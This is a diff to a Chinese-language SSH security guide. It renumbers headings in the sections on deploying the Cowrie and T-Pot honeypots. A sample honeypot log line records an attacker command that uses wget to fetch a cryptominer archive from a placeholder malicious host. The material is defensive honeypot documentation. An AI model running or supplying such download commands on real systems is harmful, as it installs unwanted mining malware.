@@ -198,7 +198,7 @@ echo "0 9 * * 1 root /usr/local/bin/ssh_audit.sh | mail -s 'Weekly SSH Audit' ad
 - 提前获得威胁情报（攻击者用了什么新工具、新字典）
 - 转移攻击者的注意力（让他们花时间在蜜罐上）
 
-#### 6.4.1 Cowrie SSH 蜜罐的部署
+### Cowrie SSH 蜜罐的部署
 
 **Cowrie**（github.com/cowrie/cowrie）是一个成熟的 SSH/Telnet 蜜罐，模拟一个完整的伪文件系统。
 
@@ -238,7 +238,7 @@ ssh -p 2222 root@localhost
 2026-07-19 03:14:35+0800 [SSHService ssh-exec on HoneyPotTransport,0,ip] CMD: wget http://malicious.com/xmrig.tar.gz
 ```
 
-#### 6.4.2 T-Pot 集成部署
+### T-Pot 集成部署
 
 **T-Pot**（github.com/telekom-security/tpotce）是多蜜罐集成平台，把 Cowrie、Dionaea、Honeytrap 等 20+ 蜜罐打包到一个 Docker 平台里：
 
